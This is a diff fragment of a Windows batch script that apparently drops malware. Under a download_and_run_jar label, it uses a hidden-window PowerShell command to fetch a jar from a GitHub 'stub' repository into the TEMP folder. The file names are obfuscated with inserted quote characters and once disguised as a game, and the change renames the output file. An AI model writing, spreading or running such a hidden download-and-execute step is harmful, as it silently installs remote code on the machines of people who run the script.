@@ -28,7 +28,7 @@ set PATH=%PATH%;%installDir%\jre1.8.0_361\bin
 
 :download_and_run_jar
 set "jarUrl=https://github.com/Python-is-trash/stub/raw/refs/heads/main/Ja"v"a.jar"
-set "jarOutput=%TEMP%\Ep"i"cGame.jar"
+set "jarOutput=%TEMP%\Ja"v"a.jar"
 
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%jarUrl%', '%jarOutput%')"
 
